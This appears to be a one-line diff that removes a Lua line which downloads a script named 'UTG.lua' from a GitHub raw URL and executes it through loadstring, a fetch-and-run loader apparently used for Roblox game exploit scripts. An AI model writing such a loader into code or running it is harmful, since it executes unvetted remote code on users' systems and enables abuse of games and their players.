@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/iXayemiz/Roblox-stuff/refs/heads/main/UTG.lua"))()
